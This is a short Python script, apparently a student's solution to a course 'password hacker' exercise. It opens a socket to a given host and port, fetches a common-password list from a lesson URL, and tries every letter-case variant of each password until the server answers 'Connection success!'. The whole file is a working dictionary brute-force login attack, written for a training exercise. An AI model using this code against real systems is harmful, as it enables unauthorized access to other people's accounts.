# write your code here
import sys
import socket
import itertools
import string
import requests


def establish_connection(ip_address: str, port: int):
    sock = socket.socket()
    address = (ip_address, port)
    sock.connect(address)
    return sock


def get_password_list():
    url = 'https://stepik.org/media/attachments/lesson/255258/passwords.txt'
    with requests.get(url) as response:
        password_list = response.content.decode('utf-8').split('\r\n')
    return password_list


def generate_password():
    password_list = get_password_list()
    for item in password_list:
        generator = ([letter.lower(), letter.upper()] for letter in item)
        for password in list(map(lambda x: ''.join(x), itertools.product(*generator))):
            yield password


def hack_password(socket_):
    generator = generate_password()
    for item in generator:
        password = ''.join(item)
        socket_.send(password.encode(encoding='utf-8'))
        response = socket_.recv(256).decode()
        if response == "Connection success!":
            return password


if __name__ == '__main__':
    args = sys.argv
    opened_socket = establish_connection(args[1], int(args[2]))
    print(hack_password(opened_socket))
    opened_socket.close()
